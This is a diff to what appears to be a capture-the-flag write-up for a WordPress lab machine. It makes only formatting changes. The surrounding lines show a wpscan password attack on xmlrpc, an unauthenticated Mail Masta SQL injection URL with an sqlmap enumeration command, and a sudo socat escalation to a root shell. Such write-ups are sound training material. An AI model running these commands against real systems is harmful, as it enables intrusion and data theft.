@@ -198,6 +198,7 @@ sudo wpscan --password-attack xmlrpc -t 20 -U elyana -P /usr/share/wordlists/roc
 
 #### Exploit Mail Masta SQLi.
 > Mail-Masta SQL Injection. Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated). GET Parameter: list_id. http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php.
+
 **Enumerate databases using SQLMap**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
@@ -557,7 +558,7 @@ User elyana may run the following commands on elyana:
     (ALL) NOPASSWD: /usr/bin/socat
 ```
 * Checked [GTFOBins](https://gtfobins.github.io/gtfobins/socat/#sudo) for information on how a user with sudo rights on socat can abuse it.
-> Sudo. If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. The resulting shell is not a proper TTY shell and lacks the prompt. `sudo socat stdin exec:/bin/sh`.
+> **Sudo**. If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. The resulting shell is not a proper TTY shell and lacks the prompt. `sudo socat stdin exec:/bin/sh`.
 ```
 -bash-4.4$ sudo socat stdin exec:/bin/sh
 whoami
